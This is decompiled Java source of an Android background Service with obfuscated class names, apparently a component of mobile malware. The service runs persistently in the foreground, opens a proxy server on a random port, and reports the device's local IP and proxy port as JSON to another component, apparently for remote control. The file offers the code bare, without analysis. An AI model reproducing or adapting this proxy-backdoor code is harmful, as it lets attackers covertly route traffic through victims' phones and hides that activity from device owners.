/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Notification
 *  android.app.Service
 *  android.content.Context
 *  android.content.Intent
 *  android.os.Build$VERSION
 *  android.os.IBinder
 *  android.util.Log
 *  org.json.JSONObject
 */
package linker.resourcer.encoder;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import linker.resourcer.encoder.MyProxy;
import linker.resourcer.encoder.etkmbyodxlwuglfdj;
import linker.resourcer.encoder.ffbrxjknfnpfxahr;
import linker.resourcer.encoder.fiptrmhubqehbzswimrkqkxtcvyp$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.maagohqzehyoivaxlfkohrpeu;
import linker.resourcer.encoder.pjdmhiibhsbamasbtrvmuxtgi;
import org.json.JSONObject;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class fiptrmhubqehbzswimrkqkxtcvyp
extends Service {
    private static int Notifi_ID = 111;
    private ExecutorService executorService;
    private MyProxy proxyServer;

    private void startforground(Context context) {
        try {
            context = pjdmhiibhsbamasbtrvmuxtgi.getInstance(context).createNotification(context);
            if (Build.VERSION.SDK_INT >= 34) {
                this.startForeground(Notifi_ID, (Notification)context, 0x40000000);
            } else {
                this.startForeground(Notifi_ID, (Notification)context);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    /* synthetic */ void lambda$onStartCommand$0$com-icontrol-protector-fiptrmhubqehbzswimrkqkxtcvyp(Context context) {
        try {
            int n;
            while (ffbrxjknfnpfxahr.isPortInUse(n = ffbrxjknfnpfxahr.randomnumber(2000, 9000))) {
            }
            Object object = new MyProxy(n);
            this.proxyServer = object;
            object = new StringBuilder();
            maagohqzehyoivaxlfkohrpeu.Debug("fiptrmhubqehbzswimrkqkxtcvyp", ((StringBuilder)object).append("Proxy server started on port ").append(n).toString());
            object = ffbrxjknfnpfxahr.getdeviceIpAddress();
            StringBuilder stringBuilder = new StringBuilder();
            maagohqzehyoivaxlfkohrpeu.Debug("fiptrmhubqehbzswimrkqkxtcvyp", stringBuilder.append("localip ").append((String)object).toString());
            stringBuilder = new JSONObject();
            stringBuilder.put("ctype", "first");
            stringBuilder.put("loip", object);
            stringBuilder.put("pport", n);
            etkmbyodxlwuglfdj.instance(context).ProxyMsg(context, (JSONObject)stringBuilder);
            this.proxyServer.start(context);
        }
        catch (Exception exception) {
            maagohqzehyoivaxlfkohrpeu.Error("fiptrmhubqehbzswimrkqkxtcvyp", "Error starting proxy server" + exception.getMessage());
            exception.printStackTrace();
            try {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("ctype", (Object)"state");
                StringBuilder stringBuilder = new StringBuilder();
                jSONObject.put("smsg", (Object)stringBuilder.append("Error: ").append(exception.getMessage()).toString());
                etkmbyodxlwuglfdj.instance(context).ProxyMsg(context, jSONObject);
            }
            catch (Exception exception2) {
                exception2.printStackTrace();
            }
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
        super.onDestroy();
        Log.d((String)"fiptrmhubqehbzswimrkqkxtcvyp", (String)"onDestroy  proxy server");
        if (this.proxyServer != null) {
            this.proxyServer.stop();
        }
        if (this.executorService != null) {
            this.executorService.shutdown();
        }
    }

    public int onStartCommand(Intent intent, int n, int n2) {
        intent = this.getApplicationContext();
        this.executorService = Executors.newSingleThreadExecutor();
        this.executorService.execute(new fiptrmhubqehbzswimrkqkxtcvyp$$ExternalSyntheticLambda0(this, (Context)intent));
        this.startforground(this.getApplicationContext());
        return 1;
    }
}

